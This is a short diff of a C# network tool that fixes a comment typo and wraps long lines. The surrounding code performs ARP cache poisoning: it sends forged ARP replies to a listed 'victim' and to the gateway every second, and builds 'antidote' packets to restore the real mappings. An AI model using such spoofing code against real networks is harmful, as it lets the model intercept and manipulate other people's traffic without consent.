@@ -262,8 +262,8 @@ namespace DipW.Classes.Manipulators
                 {
                     foreach (var target in _targets)
                     {
-                        communicator.SendPacket(BuildPoisonArpPacketReply(target, _gateway)); //Packet which gets send to the victim
-                        communicator.SendPacket(BuildPoisonArpPacketReply(_gateway, target)); //Packet which gets send to the gateway
+                        communicator.SendPacket(BuildPoisonArpPacketReply(target, _gateway)); //Packet which gets sent to the victim
+                        communicator.SendPacket(BuildPoisonArpPacketReply(_gateway, target)); //Packet which gets sent to the gateway
                     }
 
                     Thread.Sleep(1000);
@@ -283,12 +283,14 @@ namespace DipW.Classes.Manipulators
 
         private Packet BuildPoisonArpPacketReply(Target PacketTarget, Target TargetToSpoof)
         {
-            return BuildArpPacketReply(new IpV4Address(PacketTarget.IP), new MacAddress(PacketTarget.MAC), new IpV4Address(TargetToSpoof.IP), _ownMacAddr);
+            return BuildArpPacketReply(new IpV4Address(PacketTarget.IP), 
+                new MacAddress(PacketTarget.MAC), new IpV4Address(TargetToSpoof.IP), _ownMacAddr);
         }
 
         private Packet BuildAntidoteArpPacketReply(Target PacketTarget, Target AntidoteSignature)
         {
-            return BuildArpPacketReply(new IpV4Address(PacketTarget.IP), new MacAddress(PacketTarget.MAC), new IpV4Address(AntidoteSignature.IP), new MacAddress(AntidoteSignature.MAC));
+            return BuildArpPacketReply(new IpV4Address(PacketTarget.IP), 
+                new MacAddress(PacketTarget.MAC), new IpV4Address(AntidoteSignature.IP), new MacAddress(AntidoteSignature.MAC));
         }
 
         private Packet BuildArpPacketReply(IpV4Address victimIp, MacAddress victimMac, IpV4Address ipToSpoof, MacAddress newSourceMac)
